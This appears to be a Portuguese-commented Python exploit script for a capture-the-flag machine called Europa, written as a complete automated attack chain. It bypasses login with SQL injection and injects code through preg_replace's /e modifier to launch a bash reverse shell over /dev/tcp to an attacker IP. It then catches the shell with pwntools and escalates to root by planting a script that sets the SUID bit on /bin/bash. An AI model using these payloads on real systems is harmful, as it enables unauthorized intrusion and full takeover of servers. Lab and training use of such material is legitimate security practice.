#!/usr/bin/python3
# coding: utf-8

import requests
import urllib3
import sys
import time
import threading
from pwn import *


# Variáveis Globais
urlLogin = "https://admin-portal.europacorp.htb/login.php"
urlTools = "https://admin-portal.europacorp.htb/tools.php"
sess = None
lPort = 443


def login():
	global sess
	try:
		urllib3.disable_warnings()
		sess = requests.session()
		sess.verify = False
		sess.keep_alive = False

		loginData = {"email": "admin@europacorp.htb' order by 5-- -", "password": "test"}

		printingStuff = log.progress("Login")
		printingStuff.status("Realizando SQLi")
		time.sleep(2)

		req = sess.post(urlLogin, data=loginData)
		if "Dashboard" in req.text:
			printingStuff.success("Login efetuado com sucesso")
			time.sleep(1)
		else:
			printingStuff.failure("Não foi possível efetuar o login...")
			sys.exit()

	except:
		print("\n[*] Algo de errado não está certo... Saindo...")
		sys.exit()


def sendingPayloadToGetReverShell():
	global sess
	try:

		printingStuff = log.progress("Reverse Shell")
		printingStuff.status("Executando payload para obter o reverse shell")
		time.sleep(2)

		reverseData = {
			"pattern": "/vtun0/e",
			"ipaddress": """system("bash -c 'bash -i > /dev/tcp/10.10.14.11/443 0>&1'")""",
			"text": "vtun0",
		}

		printingStuff.status("Enviando petição ao servidor")
		time.sleep(2)
		req = sess.post(urlTools, data=reverseData, timeout=1)

	except requests.exceptions.ReadTimeout:
		printingStuff.success("Petição enviada com sucesso")
		time.sleep(1)


def getReverseShell():
	login()
	sendingPayloadToGetReverShell()


try:
	threading.Thread(target=getReverseShell).start()
except Exception as e:
	log.error(str(e))


shell = listen(lPort, timeout=20).wait_for_connection()

if shell.sock is None:
	log.failure("Não foi possível realizar o Reverse Shell")
	sys.exit()
else:
	log.success("Reverse Shell estabelecido")
	time.sleep(1)
	log.info("Acceso ao sistem com usuário www-data")


printingStuff = log.progress("Escalada de privilégio")
printingStuff.status("Criando payload")
time.sleep(2)
shell.sendline(
	"echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /var/www/cmd/logcleared.sh; chmod +x /var/www/cmd/logcleared.sh"
)
printingStuff.status("Payload introduzido. Alterando o sistema alvo! (Este processo leva tempo... +- 01m30s)")
time.sleep(65)
shell.sendline("bash -p")
printingStuff.success("Pwned!!")


shell.interactive()